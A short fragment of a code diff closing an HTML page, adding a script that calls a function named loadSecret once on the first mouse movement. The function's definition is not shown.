+  window.addEventListener("mousemove", () => {
+    loadSecret();
+  }, { once: true });
+</script>
+</body>
+</html>
